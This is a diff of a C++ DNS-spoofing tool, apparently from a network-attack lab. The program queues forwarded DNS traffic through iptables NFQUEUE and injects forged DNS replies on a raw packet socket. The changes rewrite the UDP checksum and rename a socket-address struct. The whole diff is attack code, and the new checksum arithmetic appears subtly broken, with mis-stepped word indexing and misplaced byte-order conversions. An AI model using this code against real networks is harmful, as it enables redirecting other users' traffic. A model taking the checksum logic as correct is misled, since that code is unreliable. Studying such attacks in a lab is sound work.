@@ -435,25 +435,27 @@ void send_spoofed_dns_reply(char *packet)
     // packet - ip_header to get the udp datagram
     udp_header->check = 0;
     uint32_t sum = 0;
-
-    // Calculate the pseudo header
-    sum += (ip_header->saddr >> 16) + (ip_header->saddr & 0xFFFF);
-    sum += (ip_header->daddr >> 16) + (ip_header->daddr & 0xFFFF);
-    sum += IPPROTO_UDP;
-
-    // Calculate the UDP datagram
-    const uint16_t* buf = reinterpret_cast<const uint16_t*>(udp_header);
-    int len_buf = (total_len - ip_header->ihl * 4) / 2 + ((total_len - ip_header->ihl * 4) % 2 != 0);
-    for (int i = 0; i < len_buf; i++) {
-        sum += ntohs(buf[i]);
+    // calculate the pseudo header
+    sum += ntohs(ip_header->saddr >> 16) + ntohs(ip_header->saddr & 0xFFFF);
+    sum += ntohs(ip_header->daddr >> 16) + ntohs(ip_header->daddr & 0xFFFF);
+    sum += IPPROTO_UDP;    
+    sum += (total_len - ip_header->ihl * 4);
+    // calculate the udp datagram
+    unsigned short *udp_checksum = (unsigned short *)(packet + ip_header->ihl * 4);
+    for (int i = 0; i < total_len - ip_header->ihl * 4; i += 2)
+    {
+        uint16_t word = ntohs(udp_checksum[i]);
+        sum += word;
     }
-
-    // Fold 32-bit sum to 16 bits
-    while (sum >> 16) {
+    if (total_len % 2)
+    {
+        sum += ntohs((uint16_t)(*(packet + total_len - 1) << 8));
+    }
+    while (sum >> 16)
+    {
         sum = (sum & 0xFFFF) + (sum >> 16);
     }
-    udp_header->check = htons(~sum);
-
+    udp_header->check = ~htons(sum);
     
 
     // calculate the ip checksum
@@ -506,17 +508,17 @@ void send_spoofed_dns_reply(char *packet)
         cerr << "Error creating socket." << endl;
     }
 
-    struct sockaddr_ll socket_address;
-    memset(&socket_address, 0, sizeof(socket_address));
-    socket_address.sll_ifindex = ifindex;
-    socket_address.sll_halen = 6;
-    socket_address.sll_protocol = htons(ETH_P_IP);
-    socket_address.sll_family = AF_PACKET;
-    socket_address.sll_pkttype = PACKET_BROADCAST;
-    socket_address.sll_hatype = htons(ARPHRD_ETHER);
-    memcpy(socket_address.sll_addr, source_mac_char, 6);
+    struct sockaddr_ll sa_ll;
+    memset(&sa_ll, 0, sizeof(sa_ll));
+    sa_ll.sll_ifindex = ifindex;
+    sa_ll.sll_halen = 6;
+    sa_ll.sll_protocol = htons(ETH_P_IP);
+    sa_ll.sll_family = AF_PACKET;
+    sa_ll.sll_pkttype = PACKET_BROADCAST;
+    sa_ll.sll_hatype = htons(ARPHRD_ETHER);
+    memcpy(sa_ll.sll_addr, source_mac_char, 6);
 
-    if(sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) == -1)
+    if(sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&sa_ll, sizeof(sa_ll)) == -1)
     {
         cerr << "Error sending packet." << endl;
     }
@@ -551,9 +553,6 @@ static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
                 // parse the dns header
                 //  struct dnshdr *dns_header = (struct dnshdr *)(packet + ip_header->ihl * 4 + sizeof(udphdr));
                 //  //parse the dns query
-
-                // char *dns_query = (char *)(packet + ip_header->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
-                // parse question section: qname qtype qclass
 
                 // use stringstream to derive the dns query
                 stringstream ss;
@@ -668,9 +667,6 @@ int main()
 
     system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
     system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
-    // char cmd[100];
-    // sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface.c_str());
-    // system(cmd);
 
     // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
     list_devices();
